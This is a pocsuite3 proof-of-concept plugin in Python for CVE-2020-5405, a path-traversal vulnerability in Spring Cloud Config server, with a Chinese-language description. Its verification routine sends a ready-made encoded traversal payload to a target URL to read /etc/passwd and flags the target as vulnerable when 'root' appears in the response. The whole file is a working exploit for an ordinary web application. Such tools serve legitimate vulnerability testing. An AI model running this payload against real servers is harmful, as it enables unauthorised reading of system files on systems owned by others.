"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['ajatar']
    vulDate = '2020-02-26'
    createDate = '2020-10-12'
    updateDate = '2020-10-12'
    references = ['https://xz.aliyun.com/t/8303']
    name = 'CVE-2020-5405 Spring Cloud Config 路径穿越漏洞'
    appPowerLink = 'https://github.com/spring-cloud/spring-cloud-config/'
    appName = 'spring-cloud-config'
    appVersion = 'versions 2.2.x -- 2.2.2、2.1.x -- 2.1.7'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''CVE-2020-5405，Spring Cloud Config允许应用程序通过spring-cloud-config-server模块使用任意配置文件。 恶意用户或攻击者可以发送精心构造的包含(_)的请求进行目录穿越攻击。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''读取目标/etc/passwd'''


    def _verify(self):
        result = {}
        if '/' == self.url[-1]:
            url = self.url
        else:
            url = self.url + '/'
        payload = "1/1/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29etc/passwd"
        r = requests.get(url+payload)
        if 'root' in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Postdata'] = payload

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
